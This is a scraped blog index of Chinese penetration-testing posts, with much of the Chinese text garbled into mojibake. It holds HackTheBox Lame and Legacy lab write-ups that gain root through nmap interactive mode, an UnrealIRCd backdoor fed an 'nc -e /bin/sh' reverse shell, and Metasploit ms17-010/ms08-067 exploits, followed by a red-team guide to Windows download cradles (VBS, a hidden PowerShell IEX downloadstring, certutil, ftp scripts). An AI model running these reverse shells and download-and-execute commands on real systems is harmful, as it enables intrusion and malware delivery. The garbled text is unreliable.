/usr/lib/telnetlogin /usr/lib/apache2/suexec /usr/lib/eject/dmcrypt-get-device /usr/lib/openssh/ssh-keysign /usr/lib/pt_chown /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper daemon@lame:/tmp$ nmap --version nmap --version Nmap version 4.53 ( http://insecure.org ) å‘ç°æœ‰nmapï¼Œç‰ˆæœ¬ä¸º4.53ï¼Œå¯ä»¥åˆ©ç”¨è¿›è¡Œææƒ nmap åœ¨ 2.02 åˆ° 5.21 ç‰ˆæœ¬ä¸­å¯ç”¨äº¤äº’æ¨¡å¼ï¼ˆâ€“interactiveï¼‰æ‰§è¡Œ shell å‘½ä»¤ The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands. daemon@lame:/tmp$ nmap --interactive nmap --interactive Starting Nmap V. 4.53 ( http://insecure.org ) Welcome to Interactive Mode -- press h \u003center\u003e for help nmap\u003e !sh !sh sh-3.2# whoami whoami root sh-3.2# cat /root/root.txt cat /root/root.txt 29ad7975c49f5ccb49b735a93efbfc4e ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:7:1","tags":["HTB","OSCP"],"title":"HTBé¶æœº Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["é¶åœº"],"content":"ææƒ2ï¼šssh key daemon@lame:/tmp$ cat /root/.ssh/authorized_keys cat /root/.ssh/authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable çœ‹åˆ°msfadmin@metasploitableï¼Œæœ€åˆä»¥ä¸ºæ˜¯å…¶ä»–æ”»å‡»æ–¹å¼ç•™ä¸‹çš„ï¼Œé‡ç½®ä¸»æœºåå‘ç°è¿˜æ˜¯å­˜åœ¨ï¼Œè¯´æ˜æ˜¯ä¸ªçº¿ç´¢ï¼Œä½†æ˜¯æˆ‘ä¸çŸ¥é“æ˜¯ä»€ä¹ˆã€‚å‚è€ƒæ–‡ç« 2å‘Šè¯‰æˆ‘æ˜¯ CVE-2008-0166 çš„çº¿ç´¢ï¼Œæ²¡äº†è§£è¿‡ï¼Œ$ searchsploit cve-2008-0166 æ— è¿‡ï¼Œä¸Šç½‘æœã€‚ OpenSSL 0.9.8c-1 up to versions before 0.9.8g-9 on Debian-based operating systems uses a random number generator that generates predictable numbers, which makes it easier for remote attackers to conduct brute force guessing attacks against cryptographic keys. â€”â€”https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0166 ç¿»è¯‘ï¼šåŸºäº Debian çš„æ“ä½œç³»ç»Ÿä¸Šçš„ OpenSSL 0.9.8c-1 åˆ° 0.9.8g-9 ä¹‹å‰çš„ç‰ˆæœ¬ä½¿ç”¨éšæœºæ•°ç”Ÿæˆå™¨ç”Ÿæˆå¯é¢„æµ‹çš„æ•°å­—ï¼Œè¿™ä½¿å¾—è¿œç¨‹æ”»å‡»è€…æ›´å®¹æ˜“å¯¹åŠ å¯†å¯†é’¥è¿›è¡Œæš´åŠ›çŒœæµ‹æ”»å‡»ã€‚ expdbæœç´¢ï¼šhttps://www.exploit-db.com/search?cve=2008-0166 çœ‹äº†ä¸€ä¸ªåˆ©ç”¨è„šæœ¬ï¼Œæè¿°æ­¥éª¤å¦‚ä¸‹ï¼š # https://www.exploit-db.com/exploits/5720 # Autor: hitz - WarCat team (warcat.no-ip.org) # Collaborator: pretoriano # # 1. Download https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2 (debian_ssh_rsa_2048_x86.tar.bz2) # # 2. Extract it to a directory # # 3. Execute the python script # - something like: python exploit.py /home/hitz/keys 192.168.1.240 root 22 5 # - execute: python exploit.py (without parameters) to display the help # - if the key is found, the script shows something like that: # Key Found in file: ba7a6b3be3dac7dcd359w20b4afd5143-1121 # Execute: ssh -lroot -p22 -i /home/hitz/keys/ba7a6b3be3dac7dcd359w20b4afd5143-1121 192.168.1.240 ############################################################################ å› ä¸ºç½‘ç»œé—®é¢˜æ²¡æ³•ä¸‹è½½5622.tar.bz2ï¼Œè¿™è¾¹å…ˆç•¥è¿‡ï¼Œå¯è§å‚è€ƒæ–‡ç« 2ï¼šprivesc2éƒ¨åˆ† ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:7:2","tags":["HTB","OSCP"],"title":"HTBé¶æœº Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["é¶åœº"],"content":"ææƒ3 : UnrealIRCd Backdoored æ¨æµ‹ç”±äºç½‘ç»œé—®é¢˜ï¼Œnetstat -nltp æ•°æ®æ²¡èƒ½å›æ˜¾è¿‡æ¥ï¼Œä»ç»“æœä¸­å‘ç°6697ç«¯å£ï¼Œé©¬ä¸Šæƒ³åˆ° IRCã€‚ ps auxww | grep -i unreal æŸ¥çœ‹unrealIRCè¿›ç¨‹ï¼Œå‘ç° UnrealIRCd ä»¥rootæƒé™è¿è¡Œã€‚ ps auxww | grep -i unreal root 5612 0.0 0.4 8540 2488 ? S 01:43 0:00 /usr/bin/unrealircd root 6522 0.0 0.1 1784 548 ? R 06:01 0:00 grep -i unreal æ ¹æ®è¿™ç¯‡æ–‡ç«  unrealircd-3281-backdoored ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ­¤æœåŠ¡æ¥åˆ›å»ºåé—¨å¹¶æ‹¿åˆ°rootæƒé™ æŒ‰ç…§å‚è€ƒæ–‡ç« 2ï¼Œåšä¸€é aemon@lame:/tmp$ nc 127.0.0.1 6697 nc 127.0.0.1 6697 :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname... :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead ERROR :Closing Link: [127.0.0.1] (Ping timeout) å¾—åˆ° Metasploitable çš„è¾“å‡ºï¼Œè¿™è¡¨æ˜æˆ‘ä»¬åœ¨æ­£ç¡®çš„æ–¹å‘ã€‚ä¸ºäº†æ–¹ä¾¿ä½¿ç”¨åé—¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å·²çŸ¥çš„connect-back shellæ–¹æ³•ã€‚ daemon@lame:/tmp$ echo \"AB; nc -e /bin/sh 10.10.14.2 5555\" | nc 127.0.0.1 6697 echo \"AB; nc -e /bin/sh 10.10.14.2 5555\" | nc 127.0.0.1 6697 :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname... :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead å¦ä¸€è¾¹ â””â”€$ nc -lvnp 5555 listening on [any] 5555 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 39370 whoami root cat /root/root.txt 29ad7975c49f5ccb49b735a93efbfc4e æµ‹è¯•å‘ç°IRCçš„6667å’Œ6697ç«¯å£éƒ½å¯ä»¥ã€‚ ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:7:3","tags":["HTB","OSCP"],"title":"HTBé¶æœº Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["é¶åœº"],"content":"ä»–å±±ä¹‹çŸ³ https://hackpentest.in/hackthebox-lame/ ä½¿ç”¨äº†pythonè·å–ä¸€ä¸ªå®Œæ•´çš„tty SHELL python -c 'import pty;pty.spawn(\"/bin/bash\")'ï¼ŒåŒæ—¶æä¾›äº†éMSFæ€è·¯ã€‚ https://coldfusionx.github.io/posts/LameHTB/ ä½¿ç”¨äº†crackmapexec ï¼Œ æ ¹æ®ç°æœ‰expè‡ªå·±å¤ç°äº†åˆ©ç”¨ä»£ç ï¼›distccdçš„æ”»å‡»æ€è·¯ã€ææƒæ€è·¯ ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:8:0","tags":["HTB","OSCP"],"title":"HTBé¶æœº Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["é¶åœº"],"content":"å¤‡æˆ˜OSCPç³»åˆ—ï¼Œä»HackTheBoxé¶åœºå¼€å§‹ã€‚","date":"2022-03-20","objectID":"/posts/hackthebox-legacy/","tags":["HTB","OSCP"],"title":"HTBé¶æœº Legacy WriteUp","uri":"/posts/hackthebox-legacy/"},{"categories":["é¶åœº"],"content":"å¤‡æˆ˜OSCPç³»åˆ—ï¼Œä»HackTheBoxé¶åœºå¼€å§‹ã€‚ ","date":"2022-03-20","objectID":"/posts/hackthebox-legacy/:0:0","tags":["HTB","OSCP"],"title":"HTBé¶æœº Legacy WriteUp","uri":"/posts/hackthebox-legacy/"},{"categories":["é¶åœº"],"content":"Legacy ç”¨æˆ·è¯„åˆ†2.5åˆ†ï¼ŒTagsï¼šInjection é¡ºä¾¿è¯´ä¸€å¥ï¼Œè¿™ä¸ªè·Ÿoscp labé‡Œçš„æŸé¶æœºå‡ ä¹ä¸€æ¨¡ä¸€æ ·ã€‚ã€‚ è€ƒç‚¹ï¼šSMBæ¼æ´ ","date":"2022-03-20","objectID":"/posts/hackthebox-legacy/:1:0","tags":["HTB","OSCP"],"title":"HTBé¶æœº Legacy WriteUp","uri":"/posts/hackthebox-legacy/"},{"categories":["é¶åœº"],"content":"WriteUp ","date":"2022-03-20","objectID":"/posts/hackthebox-legacy/:2:0","tags":["HTB","OSCP"],"title":"HTBé¶æœº Legacy WriteUp","uri":"/posts/hackthebox-legacy/"},{"categories":["é¶åœº"],"content":"0.SCAN nmapæ‰«ææœåŠ¡ï¼Œéœ€è¦ç”¨-Pn $ nmap -F 10.10.10.4 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-15 12:58 HKT Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn Nmap done: 1 IP address (0 hosts up) scanned in 3.07 seconds $ nmap -Pn -T4 10.10.10.4 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-15 13:01 HKT Nmap scan report for 10.10.10.4 Host is up (0.24s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp closed ms-wbt-server ä½¿ç”¨-sC åç»“æœå¦‚ä¸‹ï¼š Host script results: |_clock-skew: mean: 5d01h01m43s, deviation: 1h24m50s, median: 5d00h01m43s | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 40600/tcp): CLEAN (Timeout) | Check 2 (port 62576/tcp): CLEAN (Timeout) | Check 3 (port 50902/udp): CLEAN (Timeout) | Check 4 (port 36848/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2022-03-20T09:07:28+02:00 |_smb2-time: Protocol negotiation failed (SMB2) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_nbstat: NetBIOS name: LEGACY, NetBIOS user: \u003cunknown\u003e, NetBIOS MAC: 00:50:56:b9:8c:eb (VMware) ä½¿ç”¨ â€“script vuln å¿«é€ŸæŸ¥æ‰¾ç›¸åº”æ¼æ´ï¼Œç»“æœå¦‚ä¸‹ï¼š PORT STATE SERVICE 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp closed ms-wbt-server Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug) | smb-vuln-ms08-067: | VULNERABLE: | Microsoft Windows system vulnerable to remote code execution (MS08-067) | State: VULNERABLE | IDs: CVE:CVE-2008-4250 | The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, | Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary | code via a crafted RPC request that triggers the overflow during path canonicalization. | | Disclosure date: 2008-10-23 | References: | https://technet.microsoft.com/en-us/library/security/ms08-067.aspx |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250 | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED å¯åˆ©ç”¨ï¼šms08-067,ms17-010 ","date":"2022-03-20","objectID":"/posts/hackthebox-legacy/:2:1","tags":["HTB","OSCP"],"title":"HTBé¶æœº Legacy WriteUp","uri":"/posts/hackthebox-legacy/"},{"categories":["é¶åœº"],"content":"1.ms17-010 ä½¿ç”¨MSFï¼ŒæŸ¥æ‰¾ç›¸åº”æ¼æ´åˆ©ç”¨æ¨¡å— $ msfconsole msf6 \u003e search ms17-010 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 1 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 2 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 3 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection 4 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce msf6 \u003e use exploit/windows/smb/ms17_010_psexec [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp msf6 exploit(windows/smb/ms17_010_psexec) \u003e set rhosts 10.10.10.4 rhosts =\u003e 10.10.10.4 msf6 exploit(windows/smb/ms17_010_psexec) \u003e set lhost 10.10.14.2 lhost =\u003e 10.10.14.2 msf6 exploit(windows/smb/ms17_010_psexec) \u003e run [*] Started reverse TCP handler on 10.10.14.2:4444 [*] 10.10.10.4:445 - Target OS: Windows 5.1 [*] 10.10.10.4:445 - Filling barrel with fish... done [*] 10.10.10.4:445 - \u003c---------------- | Entering Danger Zone | ----------------\u003e [*] 10.10.10.4:445 - [*] Preparing dynamite... [*] 10.10.10.4:445 - [*] Trying stick 1 (x86)...Boom! [*] 10.10.10.4:445 - [+] Successfully Leaked Transaction! [*] 10.10.10.4:445 - [+] Successfully caught Fish-in-a-barrel [*] 10.10.10.4:445 - \u003c---------------- | Leaving Danger Zone | ----------------\u003e [*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x81e77660 [*] 10.10.10.4:445 - Built a write-what-where primitive... [+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained! [*] 10.10.10.4:445 - Selecting native target [*] 10.10.10.4:445 - Uploading payload... CUwrRlZx.exe [*] 10.10.10.4:445 - Created \\CUwrRlZx.exe... [+] 10.10.10.4:445 - Service started successfully... [*] Sending stage (175174 bytes) to 10.10.10.4 [*] 10.10.10.4:445 - Deleting \\CUwrRlZx.exe... [*] Meterpreter session 1 opened (10.10.14.2:4444 -\u003e 10.10.10.4:1031 ) at 2022-03-1513:52:36 +0800 meterpreter \u003e meterpreter \u003e getsystem ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)). meterpreter \u003e shell cd C:\\Documents and Settings\\john\\Desktop C:\\Documents and Settings\\john\\Desktop\u003emore user.txt more user.txt e69af0e4f443de7e36876fda4ec7644f cd C:\\Documents and Settings\\Administrator\\Desktop C:\\Documents and Settings\\Administrator\\Desktop\u003emore root.txt more root.txt 993442d258b0e0ec917cae9e695d5713 # shell è¿›å»å¤ªç¬¨é‡äº† meterpreter \u003e search -f user.txt Found 1 result... ================= Path Size (bytes) Modified (UTC) ---- ------------ -------------- c:\\Documents and Settings\\john\\Desktop\\user.txt 32 2017-03-16 14:19:49 +0800 meterpreter \u003e cat \"c:\\Documents and Settings\\john\\Desktop\\user.txt\" e69af0e4f443de7e36876fda4ec7644 meterpreter \u003e search -f root.txt Found 1 result... ================= Path Size (bytes) Modified (UTC) ---- ------------ -------------- c:\\Documents and Settings\\Administrator\\Desktop\\root.txt 32 2017-03-1614:18:50 +0800 meterpreter \u003e cat \"c:\\Documents and Settings\\Administrator\\Desktop\\root.txt\" 993442d258b0e0ec917cae9e695d5713 serach -f æ–‡ä»¶åæŸ¥æ‰¾æ–‡ä»¶è·¯å¾„ Kali /usr/share/windows-binariesç›®å½•ä¸‹è‡ªå¸¦ä¸€äº›Windowsä¸‹å‘½ä»¤ ","date":"2022-03-20","objectID":"/posts/hackthebox-legacy/:2:2","tags":["HTB","OSCP"],"title":"HTBé¶æœº Legacy WriteUp","uri":"/posts/hackthebox-legacy/"},{"categories":["é¶åœº"],"content":"2.ms08-067 msf6 exploit(windows/smb/ms17_010_psexec) \u003e use windows/smb/ms08_067_netapi msf6 exploit(windows/smb/ms08_067_netapi) \u003e set rhosts 10.10.10.4 rhosts =\u003e 10.10.10.4 msf6 exploit(windows/smb/ms08_067_netapi) \u003e set lhost 10.10.14.2 lhost =\u003e 10.10.14.2 msf6 exploit(windows/smb/ms08_067_netapi) \u003e run [*] Started reverse TCP handler on 10.10.14.2:4444 [*] 10.10.10.4:445 - Automatically detecting the target... [*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English [*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX) [*] 10.10.10.4:445 - Attempting to trigger the vulnerability... [*] Sending stage (175174 bytes) to 10.10.10.4 [*] Meterpreter session 2 opened (10.10.14.2:4444 -\u003e 10.10.10.4:1032 ) at 2022-03-15 14:42:38 +0800 meterpreter \u003e meterpreter \u003e upload /usr/share/windows-binaries/whoami.exe meterpreter \u003e shell C:\\WINDOWS\\system32\u003ewhoami whoami NT AUTHORITY\\SYSTEM ","date":"2022-03-20","objectID":"/posts/hackthebox-legacy/:2:3","tags":["HTB","OSCP"],"title":"HTBé¶æœº Legacy WriteUp","uri":"/posts/hackthebox-legacy/"},{"categories":["é¶åœº"],"content":"ä»–å±±ä¹‹ç‰ Hackthebox walkthrough - Legacyï¼ˆè€ƒç‚¹:smbåˆ©ç”¨ blueï¼‰ï¼šä½¿ç”¨äº†å¦ä¸€ä¸ªexpå·¥å…·ï¼šAutoBlue-MS17-010ï¼Œæåˆ°äº†WindowsXPç³»ç»Ÿæ²¡æœ‰whoamiçš„é—®é¢˜ã€‚ HackTheBox â€” Legacy Writeupï¼šä½¿ç”¨äº†MS08-067ï¼ˆpythonè„šæœ¬ï¼‰å’ŒMS07-010ï¼ˆpythonè„šæœ¬+MSFï¼‰ï¼Œæåˆ°äº†/usr/share/windows-binaries/ åœ¨OSCPçš„è¿›æ”»æ–¹è®¤è¯è€ƒè¯•ä¸­åªå…è®¸å¯¹ä¸€å°ä¸»æœºç”¨msfï¼Œæ‰€ä»¥åœ¨æµ‹è¯•çš„æ—¶å€™å°½é‡é¿å…ç”¨msfï¼ˆç›´æ¥ç”¨msfå¾ˆlowï¼‰ ","date":"2022-03-20","objectID":"/posts/hackthebox-legacy/:3:0","tags":["HTB","OSCP"],"title":"HTBé¶æœº Legacy WriteUp","uri":"/posts/hackthebox-legacy/"},{"categories":["Pentest"],"content":"æœ¬æ–‡ç®€è¿°å†…ç½‘Windowsä¸»æœºæ–‡ä»¶ä¼ è¾“æŠ€æœ¯ï¼ŒåŒ…æ‹¬åˆ©ç”¨ftpã€VBScriptã€powershellã€certutilã€bitsadminã€Xcopyï¼Œéƒ½æ˜¯äº›è€æŠ€æœ¯ï¼Œæ•´ç†åˆ†äº«ã€‚","date":"2021-11-13","objectID":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/","tags":["pentest","RedTeam","å†…ç½‘æ¸—é€"],"title":"005-å†…ç½‘æ–‡ä»¶ä¼ è¾“æŠ€æœ¯ Windowsç¯‡","uri":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/"},{"categories":["Pentest"],"content":"æœ¬æ–‡ç®€è¿°å†…ç½‘Windowsä¸»æœºæ–‡ä»¶ä¼ è¾“æŠ€æœ¯ï¼ŒåŒ…æ‹¬åˆ©ç”¨ftpã€VBScriptã€powershellã€certutil.exeã€bitsadminã€Xcopyï¼Œéƒ½æ˜¯äº›è€æŠ€æœ¯ï¼Œæ•´ç†åˆ†äº«ã€‚ ","date":"2021-11-13","objectID":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/:0:0","tags":["pentest","RedTeam","å†…ç½‘æ¸—é€"],"title":"005-å†…ç½‘æ–‡ä»¶ä¼ è¾“æŠ€æœ¯ Windowsç¯‡","uri":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/"},{"categories":["Pentest"],"content":"ä¸€ã€ftp windows å…¨å¹³å°è‡ªå¸¦ftpï¼Œåœ¨å®æˆ˜ä¸­éœ€è¦è€ƒè™‘ä¸¤ç‚¹ã€‚ æ•°æ®ä¼ è¾“çš„å®Œæ•´æ€§ã€‚ ä»£ç ç²¾ç®€ ftpæ–‡ä»¶çš„ä¼ è¾“æ–¹å¼ï¼š Binaryï¼ŒäºŒè¿›åˆ¶æ–¹å¼ï¼› ASCIIï¼ŒASCIIä¼ è¾“ åœ¨FTPæ–‡ä»¶ä¼ è¾“è¿‡ç¨‹ä¸­ï¼ŒASCIIä¼ è¾“HTMLå’Œæ–‡æœ¬ç¼–å†™çš„æ–‡ä»¶ï¼Œè€ŒäºŒè¿›åˆ¶ç ä¼ è¾“å¯ä»¥ä¼ é€æ–‡æœ¬å’Œéæ–‡æœ¬ï¼ˆæ‰§è¡Œæ–‡ä»¶ï¼Œå‹ç¼©æ–‡ä»¶ï¼Œå›¾ç‰‡ç­‰ï¼‰ï¼Œå…·æœ‰é€šç”¨æ€§ï¼ŒäºŒè¿›åˆ¶ç ä¼ è¾“é€Ÿåº¦æ¯”ASCIIä¼ è¾“è¦å¿«ã€‚ å‘½ä»¤ï¼š echo open 192.168.1.115 21\u003e ftp.txt echo 123\u003e\u003e ftp.txt # ç”¨æˆ·å echo 123\u003e\u003e ftp.txt # å¯†ç  echo binary \u003e\u003e ftp.txt # binæ¨¡å¼ï¼Œè®¾ç½®äºŒè¿›åˆ¶ä¼ è¾“ç±»å‹ echo get robots.txt \u003e\u003e ftp.txt # æ¥æ”¶æŒ‡å®šæ–‡ä»¶ echo bye \u003e\u003e ftp.txt # ç»ˆæ­¢ftpä¼šè¯å¹¶é€€å‡ºï¼ŒåŒquit # æŒ‡å®šåŒ…å« FTP å‘½ä»¤çš„æ–‡æœ¬æ–‡ä»¶ï¼›å‘½ä»¤åœ¨ FTP å¯åŠ¨åè‡ªåŠ¨è¿è¡Œã€‚ ftp -s:ftp.txt del /F /Q ftp.txt # å®‰é™æ¨¡å¼å¼ºåˆ¶åˆ é™¤ftpæ–‡ä»¶ ç²¾ç®€æˆä¸€å¥è¯ echo open IP \u003e o\u0026echo user UserName Password \u003e\u003e o \u0026echo get Target_File.exe \u003e\u003e o \u0026echo quit \u003e\u003e o \u0026ftp â€n â€s:o \u0026del /F /Q o # -AåŒ¿åç™»å½•ä¸‹è½½æ–‡ä»¶ echo open IP \u003e o \u0026 echo get Target_File.exe \u003e\u003e o \u0026echo quit\u003e\u003eo \u0026ftp -A -n -s:o \u0026 del /F /Q o ","date":"2021-11-13","objectID":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/:1:0","tags":["pentest","RedTeam","å†…ç½‘æ¸—é€"],"title":"005-å†…ç½‘æ–‡ä»¶ä¼ è¾“æŠ€æœ¯ Windowsç¯‡","uri":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/"},{"categories":["Pentest"],"content":"äºŒã€VBS ç¼–å†™VBSè„šæœ¬å¹¶ä¿å­˜ set a=createobject(\"adod\"+\"b.stream\"):set w=createobject(\"micro\"+\"soft.xmlhttp\"):w.open\"get\",wsh.arguments( 0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 ä¹Ÿå¯ä»¥ç”¨echoæ–¹å¼å†™å…¥vbs echo set a=createobject(^\"adod^\"+^\"b.stream^\"):set w=createobject(^\"micro^\"+^\"soft.xmlhttp^\"):w.open ^\"get^\",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 \u003e\u003e downfile.vbs å‘½ä»¤è¡Œä¸‹è½½ cscript downfile.vbs http://192.168.126.130:8000/flag.txt C:\\Inetpub\\b.txt ä¹Ÿå¯ä»¥æŠŠå‚æ•°ç›´æ¥å†™å…¥vbsæ–‡ä»¶ä¸­ï¼Œç›´æ¥æ‰§è¡Œã€‚ ä¼˜ç‚¹ï¼šæ”¯æŒwindowså…¨ç‰ˆæœ¬ç³»åˆ—ç¼ºç‚¹ï¼šå¯¹httpsä¸å‹å¥½ VBSä½œä¸ºä¸€é—¨ä»£ç è¯­è¨€ï¼Œå¯ä»¥æœ‰å¤šç§ä»£ç ç¼–å†™çš„æ–¹å¼ï¼Œä¸åªè¿™ä¸€ç§ ","date":"2021-11-13","objectID":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/:2:0","tags":["pentest","RedTeam","å†…ç½‘æ¸—é€"],"title":"005-å†…ç½‘æ–‡ä»¶ä¼ è¾“æŠ€æœ¯ Windowsç¯‡","uri":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/"},{"categories":["Pentest"],"content":"ä¸‰ã€Powershell # è¿œç¨‹ä¸‹è½½æ–‡ä»¶åˆ°æœ¬åœ°ï¼š powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.183.138:8000/test.txt','test.exe') powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://192.168.111.1:8080/exp.exe','C:\\Users\\1day\\Desktop\\Tools\\exp.exe') exp.exe # ç›´æ¥æŠŠæ–‡æœ¬è½¬æ¢ä¸ºexeæ–‡ä»¶è¿è¡Œï¼Œæ— æ®‹ç•™æ–‡ä»¶ powershell -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.183.138:8000/test.txt'))\" ","date":"2021-11-13","objectID":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/:3:0","tags":["pentest","RedTeam","å†…ç½‘æ¸—é€"],"title":"005-å†…ç½‘æ–‡ä»¶ä¼ è¾“æŠ€æœ¯ Windowsç¯‡","uri":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/"},{"categories":["Pentest"],"content":"å››ã€certutil Certutil.exeæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œç¨‹åºï¼Œä½œä¸ºè¯ä¹¦æœåŠ¡çš„ä¸€éƒ¨åˆ†å®‰è£…ã€‚æ‚¨å¯ä»¥ä½¿ç”¨Certutil.exeè½¬å‚¨å’Œæ˜¾ç¤ºè¯ä¹¦é¢å‘æœºæ„ï¼ˆCAï¼‰é…ç½®ä¿¡æ¯ï¼Œé…ç½®è¯ä¹¦æœåŠ¡ï¼Œå¤‡ä»½å’Œè¿˜åŸCAç»„ä»¶ä»¥åŠéªŒè¯è¯ä¹¦ï¼Œå¯†é’¥å¯¹å’Œè¯ä¹¦é“¾ã€‚ certutil.exe -urlcache -split -f http://192.168.16.157/exp.exe # certutil.exeä¸‹è½½æœ‰ä¸ªå¼Šç«¯ï¼Œå®ƒçš„æ¯ä¸€æ¬¡ä¸‹è½½éƒ½æœ‰ç•™æœ‰ç¼“å­˜ï¼Œæ‰€ä»¥æ¯æ¬¡ä¸‹è½½åéœ€è¦æ¸…é™¤ç¼“å­˜ certutil.exe -urlcache -split -f http://192.168.16.157/exp.exe delete //åˆ é™¤ç¼“å­˜ exp.exe -URLCache -- æ˜¾ç¤ºæˆ–åˆ é™¤ URL ç¼“å­˜é¡¹ç›® -split -- 